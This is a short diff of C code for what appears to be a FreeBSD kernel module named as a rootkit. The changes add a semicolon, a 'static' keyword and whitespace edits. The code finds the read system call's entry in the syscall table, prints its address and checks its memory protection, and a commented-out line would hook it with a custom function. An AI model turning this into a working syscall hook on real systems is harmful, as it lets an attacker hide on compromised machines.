@@ -9,12 +9,12 @@
 #include <sys/types.h>
 #include <vm/vm.h>
 #include <vm/vm_map.h>
-
+ 
 
 static struct sysent *original_sysread;
 
 // function to check is sysread is read only
-void check_memory_protection(vm_offset_t address) {
+static void check_memory_protection(vm_offset_t address) {
     vm_map_t map = kernel_map;  // Kernel's memory map
     vm_map_entry_t entry;
 
@@ -36,7 +36,7 @@ static int find_sysread_address (void) {
 
     if (original_sysread->sy_call) {
         uprintf("Sysread found at address: %p\n", original_sysread->sy_call);
-        check_memory_protection((vm_offset_t)original_sysread->sy_call)
+        check_memory_protection((vm_offset_t)original_sysread->sy_call);
 
         // sysent[SYS_read].sy_call = (sy_call_t *)custom_sysread; 
         return 0;
@@ -74,7 +74,6 @@ static int rootkit_handler(struct module *module, int event, void *arg) {
     }
     return 0;
 }
-
 
 
 
